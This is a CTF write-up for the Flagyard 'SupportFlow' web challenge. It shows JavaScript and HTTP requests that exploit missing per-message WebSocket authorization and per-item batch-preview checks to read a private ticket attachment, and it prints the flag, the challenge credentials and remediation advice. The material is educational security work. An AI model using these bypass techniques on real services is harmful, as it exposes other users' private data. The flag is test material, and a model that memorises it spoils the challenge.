---
title: "SupportFlow — Flagyard WEB CTF Write-up"
platform: Flagyard
category: WEB
difficulty: Medium
tags:
  - CTF
  - Flagyard
  - Web-Security
  - WebSocket
  - Broken-Access-Control
  - IDOR
---

# SupportFlow — CTF Write-up

## Challenge Information

* **Name:** SupportFlow
* **Platform:** Flagyard
* **Category:** WEB
* **Difficulty:** Medium
* **Author:** Flagyard

## Challenge Overview

> "SupportFlow recently rolled out a new real-time ticket experience. One of our internal teams says customers occasionally receive updates they shouldn't be seeing. Can you figure out what is happening?"

The challenge revolves around a support ticketing system that streams real-time updates via WebSocket. The objective is to investigate why unauthorized ticket updates are leaked to low-privileged users, exploit the access control flaws, and retrieve the flag.

### Provided Credentials

| Parameter | Value |
|---|---|
| Username / Email | `analyst@acme.local` |
| Password | `support123` |
| Organization | `org_acme` (Acme Corp) |
| Role | `analyst` |

---

## Reconnaissance

After authenticating using the provided credentials, querying the user profile endpoint (`GET /api/me`) yielded the following information:

```json
{
  "email": "analyst@acme.local",
  "id": "user_analyst",
  "latestTicketSequence": 9001,
  "name": "Morgan Hale",
  "organization": {
    "id": "org_acme",
    "name": "Acme Corp"
  },
  "role": "analyst"
}
```

Notice that `latestTicketSequence` is set to `9001`. 

Next, querying `GET /api/tickets` listed only two authorized tickets:

| Ticket ID | Priority | Requester | Status | Subject |
|---|---|---|---|---|
| `ticket_1001` | High | Jordan Ellis | Open | Unable to export monthly report |
| `ticket_1002` | Normal | Priya Shah | Pending | SSO redirect loop for contractors |

Attempting to access the internal ticket `ticket_9001` directly via REST returned a permission error:

```http
GET /api/tickets/ticket_9001 HTTP/1.1
Host: [CHALLENGE_HOST]
```

**Response:**
```http
HTTP/1.1 403 Forbidden

{"error":"forbidden"}
```

Direct REST access to internal tickets is clearly protected.

---

## Solution Steps

### Step 1: Discovering the WebSocket Logic

Inspecting the frontend source code (`/static/app.js`) revealed that real-time updates are handled over a WebSocket connection at `/ws`. The client subscribes to tickets using the following JSON structure:

```json
{
  "action": "subscribe",
  "channel": "ticket",
  "ticketId": "ticket_1001"
}
```

Key functions identified in `/static/app.js`:
* `openTicketChannel()` — Establishes the WebSocket connection and sends the initial subscription.
* `onLiveEvent()` — Handles incoming events (`message`, `attachment_added`).
* `previewAttachments()` — Sends attachment IDs to a batch preview API endpoint.

### Step 2: Bypassing WebSocket Subscription Controls

Attempting to subscribe directly to `ticket_9001` over a fresh WebSocket connection returned an error:

```json
{"error":"forbidden"}
```

However, testing the order of subscription actions on **the same connection** revealed an authorization bypass flaw:

1. Connect to `/ws`.
2. Subscribe to an authorized ticket (`ticket_1001`).
3. Send a second `subscribe` request for the unauthorized ticket (`ticket_9001`) on the **same active connection**.

```javascript
const ws = new WebSocket(`wss://${location.host}/ws`);

ws.onmessage = event => console.log("[SERVER]", event.data);

ws.onopen = () => {
  // 1. Subscribe to authorized ticket
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: "ticket",
    ticketId: "ticket_1001"
  }));

  // 2. Subscribe to internal ticket on the same connection
  setTimeout(() => {
    ws.send(JSON.stringify({
      action: "subscribe",
      channel: "ticket",
      ticketId: "ticket_9001"
    }));
  }, 500);
};
```

**Result:** The server accepted the second subscription request and streamed internal ticket messages and attachment metadata:

```json
{"event":"subscribed","ticketId":"ticket_9001"}
{"event":"message","ticketId":"ticket_9001","message":{"author":"Operations","body":"Please keep this escalation restricted to internal operations.","id":"msg_9001_1"}}
{"event":"message","ticketId":"ticket_9001","message":{"author":"Support","body":"Diagnostic data attached.","id":"msg_9001_2"}}
{"event":"attachment_added","ticketId":"ticket_9001","attachment":{"filename":"support-escalation.txt","id":"att_private_9001"}}
```

This leaked the private attachment ID: `att_private_9001`.

### Step 3: Bypassing Batch Attachment Preview Restrictions

Attempting to fetch the private attachment directly resulted in an access error:

```http
GET /api/attachments/att_private_9001 HTTP/1.1
```
**Response:** `403 Forbidden`

Sending only the private attachment to the batch preview endpoint also failed:

```http
POST /api/attachments/batch-preview HTTP/1.1
Content-Type: application/json

{
  "attachments": [
    { "id": "att_private_9001", "operation": "preview" }
  ]
}
```
**Response:** `403 Forbidden`

**The Bypass:**
Including a valid, authorized attachment ID (`att_public_001`) alongside the private attachment ID (`att_private_9001`) inside the same batch request bypassed the authorization filter entirely:

```http
POST /api/attachments/batch-preview HTTP/1.1
Content-Type: application/json

{
  "attachments": [
    { "id": "att_public_001", "operation": "preview" },
    { "id": "att_private_9001", "operation": "preview" }
  ]
}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "results": [
    {
      "id": "att_public_001",
      "content": "SupportFlow console capture..."
    },
    {
      "id": "att_private_9001",
      "content": "SupportFlow Internal Escalation\n\nEnvironment: production\nClassification: internal\n\nIncident notes:\nThe production integration has been isolated and escalated.\n\nCTF reference:\nFlagY{41d7a28560d8b7d21a460c7299b2a2cb}"
    }
  ]
}
```

---

## Flag

`FlagY{41d7a28560d8b7d21a460c7299b2a2cb}`

---

## Root Cause & Remediation

### Root Cause

1. **Inconsistent WebSocket Authorization:** The WebSocket subscription handler fails to re-validate user authorization on subsequent `subscribe` messages sent over an established connection once an initial authorized subscription succeeds.
2. **Batch Request Validation Flaw:** The `/api/attachments/batch-preview` endpoint checks authorization at the batch level or validates only the first item in the array, failing to perform per-item access control enforcement.

### Remediation Guidelines

1. **Per-Message Re-authorization:** Validate permissions for *every* incoming `subscribe` frame on WebSocket channels, regardless of connection state or prior subscriptions.
2. **Strict Batch Validation:** Perform atomic, per-resource authorization checks for every item in a batch request (`Array.every()` instead of loose validation). If any resource in the request is unauthorized, reject or sanitize the unauthorized item explicitly.
3. **Least Privilege Metadata:** Ensure WebSocket channels do not broadcast sensitive internal attachment IDs or message previews to unauthorized clients.